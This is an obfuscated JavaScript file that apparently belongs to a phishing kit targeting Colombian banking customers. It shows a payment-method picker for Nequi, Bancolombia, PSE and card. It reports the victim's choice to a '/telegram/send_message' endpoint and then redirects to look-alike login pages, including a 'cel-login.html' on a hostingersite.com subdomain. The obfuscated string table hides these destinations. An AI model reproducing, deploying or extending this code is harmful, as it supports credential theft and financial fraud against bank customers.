function _0x30bd(_0x75c74f, _0x5471cc) {
  const _0x2c13b1 = _0x2c13();
  return (
    (_0x30bd = function (_0x30bd61, _0x45d1e5) {
      _0x30bd61 = _0x30bd61 - 0x67;
      let _0x3f518c = _0x2c13b1[_0x30bd61];
      return _0x3f518c;
    }),
    _0x30bd(_0x75c74f, _0x5471cc)
  );
}
const _0x500a1d = _0x30bd;
(function (_0x340d05, _0x154a1d) {
  const _0x386e70 = _0x30bd,
    _0x1f35cd = _0x340d05();
  while (!![]) {
    try {
      const _0xedcc1e =
        (parseInt(_0x386e70(0x97)) / 0x1) * (-parseInt(_0x386e70(0x8b)) / 0x2) +
        -parseInt(_0x386e70(0x76)) / 0x3 +
        parseInt(_0x386e70(0x7b)) / 0x4 +
        parseInt(_0x386e70(0x8f)) / 0x5 +
        (-parseInt(_0x386e70(0x80)) / 0x6) * (parseInt(_0x386e70(0x88)) / 0x7) +
        (-parseInt(_0x386e70(0x86)) / 0x8) * (parseInt(_0x386e70(0x71)) / 0x9) +
        (parseInt(_0x386e70(0xa3)) / 0xa) * (parseInt(_0x386e70(0xa4)) / 0xb);
      if (_0xedcc1e === _0x154a1d) break;
      else _0x1f35cd["push"](_0x1f35cd["shift"]());
    } catch (_0x410801) {
      _0x1f35cd["push"](_0x1f35cd["shift"]());
    }
  }
})(_0x2c13, 0x8d19b),
  document["getElementById"]("select")[_0x500a1d(0x84)](
    _0x500a1d(0x8a),
    function () {
      const _0x8e116e = _0x500a1d;
      this["classList"][_0x8e116e(0x9e)](_0x8e116e(0x75));
    }
  );
const opciones = document[_0x500a1d(0xa1)](_0x500a1d(0xa5));
let selectedOption = null;
opciones[_0x500a1d(0x6d)]((_0x2e3608) => {
  const _0x35752a = _0x500a1d;
  _0x2e3608[_0x35752a(0x84)](_0x35752a(0x8a), function (_0x583223) {
    const _0x104b70 = _0x35752a,
      _0x3708a3 = document[_0x104b70(0x95)](".contenido-select"),
      _0x526ec1 = this["querySelector"](_0x104b70(0xa0))[_0x104b70(0x90)],
      _0x4ba652 = this[_0x104b70(0x95)](_0x104b70(0x6b))["textContent"];
    (_0x3708a3[_0x104b70(0x6a)] =
      _0x104b70(0x8c) + _0x526ec1 + _0x104b70(0x78) + _0x4ba652 + "</span>"),
      document[_0x104b70(0x91)](_0x104b70(0x7d))[_0x104b70(0xa2)][
        _0x104b70(0x82)
      ]("active");
    const _0x2c8232 = document[_0x104b70(0x91)]("nextStep");
    (_0x2c8232[_0x104b70(0x7c)] = ![]),
      _0x2c8232["classList"][_0x104b70(0x99)]("btn-enabled"),
      (selectedOption = _0x526ec1[_0x104b70(0x77)]("/")[_0x104b70(0x73)]()),
      console[_0x104b70(0x79)](selectedOption),
      _0x583223["stopPropagation"]();
  });
}),
  document[_0x500a1d(0x91)]("nextStep")[_0x500a1d(0x84)](
    _0x500a1d(0x8a),
    async function () {
      const _0x25b969 = _0x500a1d;
      if (!selectedOption) {
        alert(_0x25b969(0x68));
        return;
      }
      let _0x2be80b;
      switch (selectedOption) {
        case "NEQ.png":
          _0x2be80b = _0x25b969(0x67);
          break;
        case _0x25b969(0x74):
          _0x2be80b = _0x25b969(0x72);
          break;
        case _0x25b969(0x87):
          _0x2be80b = _0x25b969(0x8e);
          break;
        case _0x25b969(0x96):
          _0x2be80b = _0x25b969(0x7e);
          break;
        default:
          alert(_0x25b969(0x9f));
          return;
      }
      document[_0x25b969(0x91)](_0x25b969(0x92))["style"][_0x25b969(0x69)] =
        _0x25b969(0x94);
      try {
        const _0x38aca6 = await fetch(url + _0x25b969(0x9d), {
          method: _0x25b969(0x70),
          headers: { "Content-Type": "application/json" },
          body: JSON[_0x25b969(0x83)]({ message: _0x2be80b }),
        });
        if (!_0x38aca6["ok"]) {
          console[_0x25b969(0x9b)](
            _0x25b969(0x7f),
            await _0x38aca6[_0x25b969(0x81)]()
          ),
            alert(_0x25b969(0x6c));
          return;
        }
        setTimeout(() => {
          const _0x13236a = _0x25b969;
          switch (selectedOption) {
            case _0x13236a(0x6e):
              window[_0x13236a(0x85)][_0x13236a(0x89)] = _0x13236a(0x7a);
              break;
            case _0x13236a(0x74):
              window[_0x13236a(0x85)][_0x13236a(0x89)] =
                "./points/trico/home.html";
              break;
            case _0x13236a(0x87):
              window[_0x13236a(0x85)]["href"] = _0x13236a(0x6f);
              break;
            case _0x13236a(0x96):
              window[_0x13236a(0x85)][_0x13236a(0x89)] = _0x13236a(0x9c);
              break;
          }
        }, 0x64);
      } catch (_0x2f5cf3) {
        console[_0x25b969(0x9b)](_0x25b969(0x8d), _0x2f5cf3),
          alert(_0x25b969(0x9a));
      } finally {
        document[_0x25b969(0x91)](_0x25b969(0x92))[_0x25b969(0x98)][
          _0x25b969(0x69)
        ] = _0x25b969(0x93);
      }
    }
  );
function _0x2c13() {
  const _0x125e35 = [
    "FORMA_PAGO_2.png",
    "525gviwDo",
    "href",
    "click",
    "2CpJAsf",
    "<img\x20src=\x22",
    "Error\x20al\x20comunicarse\x20con\x20la\x20API:",
    "🟢\x20Tarjeta",
    "4498315DVigdz",
    "src",
    "getElementById",
    "loader-container",
    "none",
    "flex",
    "querySelector",
    "pse.png",
    "451663fLLTFr",
    "style",
    "add",
    "Ocurrió\x20un\x20error\x20inesperado.\x20Intenta\x20nuevamente.",
    "error",
    "./ps.html",
    "/telegram/send_message",
    "toggle",
    "Opción\x20no\x20válida\x20seleccionada.",
    "img",
    "querySelectorAll",
    "classList",
    "55780TZpCDE",
    "814CPbgZG",
    ".opcion",
    "🔵\x20Nequi",
    "Por\x20favor\x20selecciona\x20una\x20opción\x20antes\x20de\x20continuar.",
    "display",
    "innerHTML",
    "span",
    "Hubo\x20un\x20problema\x20al\x20procesar\x20tu\x20solicitud.\x20Intenta\x20nuevamente.",
    "forEach",
    "NEQ.png",
    "./tc.html",
    "POST",
    "45mBJegq",
    "🟡\x20Bancolombia",
    "pop",
    "bancolombia.png",
    "active",
    "942453MfqglK",
    "split",
    "\x22\x20alt=\x22icono\x22\x20class=\x22icono-seleccionado\x22>\x20<span>",
    "log",
    "./blueviolet-okapi-275780.hostingersite.com//boton/dinadatos/bancol/cel-login.html",
    "3408824doLJwI",
    "disabled",
    "select",
    "🟣\x20PSE",
    "Error\x20al\x20procesar\x20la\x20opción\x20seleccionada:",
    "25518GYakbJ",
    "json",
    "remove",
    "stringify",
    "addEventListener",
    "location",
    "803048OjMAdD",
  ];
  _0x2c13 = function () {
    return _0x125e35;
  };
  return _0x2c13();
}


